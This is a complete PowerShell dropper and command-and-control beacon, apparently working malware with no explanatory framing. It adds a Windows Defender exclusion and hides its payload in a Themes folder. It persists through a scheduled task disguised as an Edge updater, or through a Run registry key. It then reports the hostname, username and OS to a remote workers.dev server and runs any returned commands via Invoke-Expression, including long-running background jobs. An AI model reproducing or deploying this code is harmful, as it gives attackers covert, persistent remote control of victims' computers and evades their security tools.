$ErrorActionPreference = 'SilentlyContinue'

$BACKEND_URL = 'https://backend.ice-cold-169.workers.dev'
$AGENT_ID = -join ((65..90) + (97..122) | Get-Random -Count 12 | ForEach-Object {[char]$_})
$BEACON_INTERVAL = 60

$InstallDir = "$env:APPDATA\Microsoft\Windows\Themes"
$BeaconPath = "$InstallDir\ThemeService.ps1"

if (!(Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

try {
    Add-MpPreference -ExclusionPath $InstallDir -Force
} catch {}

# ENHANCED BEACON SCRIPT WITH BACKGROUND JOB SUPPORT
$BeaconScript = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$BACKEND_URL = '$BACKEND_URL'
`$AGENT_ID = '$AGENT_ID'
`$BEACON_INTERVAL = $BEACON_INTERVAL

# Global job tracking
`$global:BackgroundJobs = @{}
`$global:JobCounter = 0

# Function to execute commands with background support
function Execute-Command {
    param([string]`$Command)
    
    # Special commands for job management
    if (`$Command -eq 'LIST_JOBS') {
        `$output = "=== Background Jobs ===``n"
        if (`$global:BackgroundJobs.Count -eq 0) {
            return "No background jobs running"
        }
        foreach (`$jobId in `$global:BackgroundJobs.Keys) {
            `$jobInfo = `$global:BackgroundJobs[`$jobId]
            `$job = `$jobInfo.Job
            `$output += "Job `$jobId : `$(`$jobInfo.Command)``n"
            `$output += "  State: `$(`$job.State)``n"
            `$output += "  Started: `$(`$jobInfo.Started)``n"
            
            # Get any available output
            `$jobOutput = Receive-Job -Job `$job -Keep 2>&1
            if (`$jobOutput) {
                `$output += "  Latest Output: `$(`$jobOutput | Select-Object -First 3 | Out-String)``n"
            }
            `$output += "``n"
        }
        return `$output
    }
    
    if (`$Command -like 'STOP_JOB:*') {
        `$jobId = [int](`$Command -split ':')[1]
        if (`$global:BackgroundJobs.ContainsKey(`$jobId)) {
            Stop-Job -Job `$global:BackgroundJobs[`$jobId].Job -ErrorAction SilentlyContinue
            Remove-Job -Job `$global:BackgroundJobs[`$jobId].Job -Force -ErrorAction SilentlyContinue
            `$cmd = `$global:BackgroundJobs[`$jobId].Command
            `$global:BackgroundJobs.Remove(`$jobId)
            return "Job `$jobId stopped: `$cmd"
        }
        return "Job `$jobId not found"
    }
    
    if (`$Command -like 'GET_JOB:*') {
        `$jobId = [int](`$Command -split ':')[1]
        if (`$global:BackgroundJobs.ContainsKey(`$jobId)) {
            `$job = `$global:BackgroundJobs[`$jobId].Job
            `$output = Receive-Job -Job `$job -Keep 2>&1 | Out-String
            if (`$output) {
                return "Job `$jobId output:``n`$output"
            }
            return "Job `$jobId : No output yet (State: `$(`$job.State))"
        }
        return "Job `$jobId not found"
    }
    
    if (`$Command -eq 'STOP_ALL_JOBS') {
        `$count = `$global:BackgroundJobs.Count
        foreach (`$jobId in `$global:BackgroundJobs.Keys) {
            Stop-Job -Job `$global:BackgroundJobs[`$jobId].Job -ErrorAction SilentlyContinue
            Remove-Job -Job `$global:BackgroundJobs[`$jobId].Job -Force -ErrorAction SilentlyContinue
        }
        `$global:BackgroundJobs.Clear()
        return "Stopped `$count background jobs"
    }
    
    # Check if command should run in background (prefix with BG:)
    if (`$Command -like 'BG:*') {
        `$actualCommand = `$Command.Substring(3)
        
        `$global:JobCounter++
        `$jobId = `$global:JobCounter
        
        # Start background job
        `$job = Start-Job -ScriptBlock {
            param(`$cmd)
            try {
                Invoke-Expression `$cmd 2>&1
            } catch {
                "ERROR: `$(`$_.Exception.Message)"
            }
        } -ArgumentList `$actualCommand
        
        # Store job info
        `$global:BackgroundJobs[`$jobId] = @{
            Job = `$job
            Command = `$actualCommand
            Started = Get-Date
        }
        
        # Return immediate confirmation with job ID
        `$msg = "Background Job `$jobId started``n"
        `$msg += "Command: `$actualCommand``n"
        `$msg += "``nJob Management Commands:``n"
        `$msg += "  GET_JOB:`$jobId - Get output``n"
        `$msg += "  STOP_JOB:`$jobId - Stop job``n"
        `$msg += "  LIST_JOBS - List all jobs``n"
        
        return `$msg
    }
    
    # Regular command - execute with timeout to prevent blocking
    try {
        # Use background job even for regular commands to prevent long-running blocks
        `$job = Start-Job -ScriptBlock {
            param(`$cmd)
            try {
                Invoke-Expression `$cmd 2>&1 | Out-String
            } catch {
                "ERROR: `$(`$_.Exception.Message)"
            }
        } -ArgumentList `$Command
        
        # Wait max 30 seconds for regular commands
        Wait-Job -Job `$job -Timeout 30 | Out-Null
        
        if (`$job.State -eq 'Running') {
            # Command is taking too long - suggest background mode
            Stop-Job -Job `$job -ErrorAction SilentlyContinue
            Remove-Job -Job `$job -Force -ErrorAction SilentlyContinue
            return "Command timed out (>30s).``nUse: BG:`$Command``nto run in background"
        }
        
        `$result = Receive-Job -Job `$job 2>&1 | Out-String
        Remove-Job -Job `$job -Force -ErrorAction SilentlyContinue
        
        return `$result
        
    } catch {
        return "ERROR: `$(`$_.Exception.Message)"
    }
}

# Main beacon loop
while (`$true) {
    try {
        `$hostname = `$env:COMPUTERNAME
        `$username = `$env:USERNAME
        `$os = (Get-WmiObject Win32_OperatingSystem).Caption
        
        `$beaconBody = @{
            id = `$AGENT_ID
            hostname = `$hostname
            username = `$username
            os = `$os
        } | ConvertTo-Json
        
        `$response = Invoke-RestMethod -Uri "`$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body `$beaconBody -TimeoutSec 30
        
        if (`$response.command -and `$response.commandId) {
            # Execute command (with background support)
            `$output = Execute-Command -Command `$response.command
            
            # Send result back
            `$resultBody = @{
                agentId = `$AGENT_ID
                commandId = `$response.commandId
                output = `$output
            } | ConvertTo-Json
            
            Invoke-RestMethod -Uri "`$BACKEND_URL/api/result" -Method Post -ContentType 'application/json' -Body `$resultBody -TimeoutSec 30 | Out-Null
        }
        
        if (`$response.interval) {
            `$BEACON_INTERVAL = `$response.interval
        }
    } catch {}
    
    Start-Sleep `$BEACON_INTERVAL
}
"@

Set-Content -Path $BeaconPath -Value $BeaconScript -Force

$TaskName = "MicrosoftEdgeUpdateTaskMachineUA"

try {
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

try {
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $Principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit (New-TimeSpan -Days 365)
    
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
} catch {
    try {
        $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $RegName = "WindowsThemeService"
        $RegValue = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`""
        Set-ItemProperty -Path $RegPath -Name $RegName -Value $RegValue -Force
    } catch {}
}

Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$BeaconPath`"" -WindowStyle Hidden

try {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    
    $initialBeacon = @{
        id = $AGENT_ID
        hostname = $hostname
        username = $username
        os = $os
    } | ConvertTo-Json
    
    Invoke-RestMethod -Uri "$BACKEND_URL/beacon" -Method Post -ContentType 'application/json' -Body $initialBeacon -TimeoutSec 30 | Out-Null
} catch {}

exit